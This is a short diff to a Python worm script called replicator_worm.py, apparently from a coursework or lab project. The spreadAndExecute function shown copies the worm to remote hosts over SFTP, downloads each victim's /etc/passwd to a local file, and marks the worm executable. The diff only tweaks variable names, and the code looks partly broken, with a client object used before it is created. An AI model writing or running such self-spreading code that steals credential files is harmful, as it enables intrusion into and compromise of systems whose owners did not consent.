@@ -82,13 +82,13 @@ def spreadAndExecute(sshClient,systemIP1):
 	# MIG: Changed this one to the SFTP client
 	if len(sys.argv) < 2:
 		interface = netifaces.interfaces()
-		systemIP = getMyIP(interface)
+		systemIP12 = getMyIP(interface)
 		sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
 		print("start to copy")
 		#copy attack system
 		sftpClient = sshClient.open_sftp()
 		remotepath = '/etc/passwd'
-		localpath = '/home/passwd_'+systemIP1
+		localpath = '/home/passwd_'+systemIP12
 		sftpClient.get(remotepath, localpath)
 
 	else:
@@ -97,7 +97,7 @@ def spreadAndExecute(sshClient,systemIP1):
 		#copy attack system
 		sftpClient = sshClient.open_sftp()
 		remotepath = '/etc/passwd'
-		localpath = '/home/passwd_'+systemIP1
+		localpath = '/home/passwd_'+systemIP1[0]
 		sftpClient.get(remotepath, localpath)
 
 	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
